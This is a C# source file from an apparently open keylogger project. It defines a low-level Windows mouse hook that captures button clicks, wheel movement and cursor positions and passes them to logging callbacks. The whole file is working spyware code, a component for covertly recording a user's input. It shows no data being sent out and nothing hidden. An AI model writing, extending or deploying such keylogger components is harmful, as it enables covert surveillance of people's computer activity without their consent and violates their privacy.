using System.Runtime.InteropServices;
using static Keylogger.Helpers.InputMessageHelper;
using static Keylogger.Interop.Win32Api;

namespace Keylogger.Hooks
{
    internal static class MouseHook
    {
        public static Hookproc Hookproc => MouseHookCallback;

        public static Action<string, string>? LogMouseButtonsCallback;
        public static Action<string, string>? LogMousePositionCallback;

        private static IntPtr MouseHookCallback(int code, UIntPtr wParam, IntPtr lParam)
        {
            if (code >= 0)
            {
                var mouseStruct = Marshal.PtrToStructure<MSLLHOOKSTRUCT>(lParam);
                var position = $"(X:{mouseStruct.pt.x}, Y:{mouseStruct.pt.y})";

                if ((MouseMessage)wParam == MouseMessage.WM_MOUSEWHEEL)
                {
                    var wheelDelta = (short)((mouseStruct.mouseData >> 16) & 0xffff);
                    var wheelDirection = wheelDelta > 0 ? "[Wheel Forward]" : "[Wheel Backward]";
                    LogMouseButtonsCallback?.Invoke(wheelDirection, position);
                }
                else if ((MouseMessage)wParam == MouseMessage.WM_MOUSEMOVE)
                {
                    LogMousePositionCallback?.Invoke($"[{GetMouseMessageName(wParam)}]", position);
                }
                else
                {
                    LogMouseButtonsCallback?.Invoke($"[{GetMouseMessageName(wParam)}]", position);
                }
            }

            return CallNextHookEx(IntPtr.Zero, code, wParam, lParam);
        }
    }
}